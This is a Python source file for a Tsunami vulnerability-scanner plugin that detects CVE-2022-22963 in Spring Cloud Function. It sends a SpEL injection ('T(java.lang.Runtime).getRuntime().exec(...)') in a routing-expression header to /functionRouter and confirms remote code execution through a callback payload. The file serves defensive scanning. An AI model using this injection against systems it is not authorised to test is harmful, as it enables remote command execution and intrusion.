# Copyright 2022 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
"""A Tsunami plugin for detecting CVE-2022-22963."""
import time
from absl import logging
from google.protobuf import timestamp_pb2
import tsunami_plugin
from common.data import network_endpoint_utils
from common.data import network_service_utils
from common.net.http.http_client import HttpClient
from common.net.http.http_headers import HttpHeaders
from common.net.http.http_request import HttpRequest
from plugin.payload.payload_generator import PayloadGenerator
import detection_pb2
import payload_generator_pb2 as pg
import plugin_representation_pb2
import vulnerability_pb2


_VULN_PATH = 'functionRouter'
_VULN_HEADER = 'spring.cloud.function.routing-expression'
_VULN_DESCRIPTION = (
    'In Spring Cloud Function versions 3.1.6, 3.2.2 and older unsupported'
    ' versions, when using routing functionality it is possible for a user to'
    ' provide a specially crafted SpEL as a routing-expression that may result'
    ' in remote code execution and access to local resources.'
)
_SLEEP_TIME_SEC = 20


class Cve202222963Detector(tsunami_plugin.VulnDetector):
  """A TsunamiPlugin that detects RCE on the Spring Cloud Function target."""

  def __init__(
      self, http_client: HttpClient, payload_generator: PayloadGenerator
  ):
    self.http_client = http_client
    self.payload_generator = payload_generator

  def GetPluginDefinition(self) -> tsunami_plugin.PluginDefinition:
    """Defines the PluginDefinition for Cve202222963Detector.

    Returns:
      The PluginDefinition used for the Tsunami engine to identify this plugin.
    """
    return tsunami_plugin.PluginDefinition(
        info=plugin_representation_pb2.PluginInfo(
            type=plugin_representation_pb2.PluginInfo.VULN_DETECTION,
            name='Cve202222963VulnDetector',
            version='1.0',
            description=_VULN_DESCRIPTION,
            author='threedr3am (qiaoer1320@gmail.com)',
        )
    )

  def Detect(
      self,
      target: tsunami_plugin.TargetInfo,
      matched_services: list[tsunami_plugin.NetworkService],
  ) -> tsunami_plugin.DetectionReportList:
    """Run detection logic for the Spring Cloud Function target.

    Args:
      target: TargetInfo about Spring Cloud Function.
      matched_services: A list of network services whose vulnerabilities could
        be detected by this plugin. "rtsp" for example would be on this list.

    Returns:
      A tsunami_plugin.DetectionReportList for all the vulnerabilities of the
      scanning target.d
    """
    logging.info('Cve202222963Detector starts detecting.')
    vulnerable_services = [
        s for s in matched_services if self._IsSupportedService(s)
    ]

    return detection_pb2.DetectionReportList(
        detection_reports=[
            self._BuildDetectionReport(target, service)
            for service in vulnerable_services
            if self._IsServiceVulnerable(service)
        ]
    )

  def _IsSupportedService(
      self, network_service: tsunami_plugin.NetworkService
  ) -> bool:
    """Check if network service is a web service or an unknown service."""
    return (
        not network_service.service_name
        or network_service_utils.is_web_service(network_service)
        or network_service_utils.get_service_name(network_service) == 'unknown'
        or network_service_utils.get_service_name(network_service) == 'rtsp'
    )

  def _IsServiceVulnerable(
      self, network_service: tsunami_plugin.NetworkService
  ) -> bool:
    """Check if network service may result in RCE."""
    config = pg.PayloadGeneratorConfig(
        vulnerability_type=pg.PayloadGeneratorConfig.VulnerabilityType.REFLECTIVE_RCE,
        interpretation_environment=pg.PayloadGeneratorConfig.InterpretationEnvironment.LINUX_SHELL,
        execution_environment=pg.PayloadGeneratorConfig.ExecutionEnvironment.EXEC_INTERPRETATION_ENVIRONMENT,
    )
    payload = self.payload_generator.generate(config)
    if not payload.get_payload_attributes().uses_callback_server:
      return False
    rce_command = 'T(java.lang.Runtime).getRuntime().exec("{}")'.format(
        payload.get_payload()
    )
    url = self._BuildUrl(network_service)
    request = (
        HttpRequest.post(url)
        .set_headers(
            HttpHeaders.builder()
            .add_header(_VULN_HEADER, rce_command)
            .build()
        )
        .set_request_body(bytes('TSUNAMI', 'utf-8'))
        .build()
    )
    try:
      response = self.http_client.send(request, network_service)
      time.sleep(_SLEEP_TIME_SEC)
      return payload.check_if_executed(response.body)
    except Exception:  # pylint: disable=broad-exception-caught
      logging.exception('Unable to query %s', url)
    return False

  def _BuildUrl(self, network_service: tsunami_plugin.NetworkService) -> str:
    """Build the vulnerable target path for RCE injection."""
    if network_service_utils.is_web_service(network_service):
      url = network_service_utils.build_web_application_root_url(
          network_service
      )
    else:
      url = 'http://{}/'.format(
          network_endpoint_utils.to_uri_authority(
              network_service.network_endpoint
          )
      )
    return url + _VULN_PATH

  def _BuildDetectionReport(
      self,
      target: tsunami_plugin.TargetInfo,
      vulnerable_service: tsunami_plugin.NetworkService,
  ) -> detection_pb2.DetectionReport:
    """Generate the detection report for all vulnerability findings."""
    return detection_pb2.DetectionReport(
        target_info=target,
        network_service=vulnerable_service,
        detection_timestamp=timestamp_pb2.Timestamp().GetCurrentTime(),
        detection_status=detection_pb2.DetectionStatus.VULNERABILITY_VERIFIED,
        vulnerability=vulnerability_pb2.Vulnerability(
            main_id=vulnerability_pb2.VulnerabilityId(
                publisher='TSUNAMI_COMMUNITY', value='CVE_2022_22963'
            ),
            severity=vulnerability_pb2.Severity.CRITICAL,
            title=(
                'Spring Cloud Function SpEL Code Injection RCE (CVE-2022-22963)'
            ),
            recommendation=(
                'Users of affected versions should upgrade to 3.1.7, 3.2.3.'
            ),
            description=_VULN_DESCRIPTION,
        ),
    )
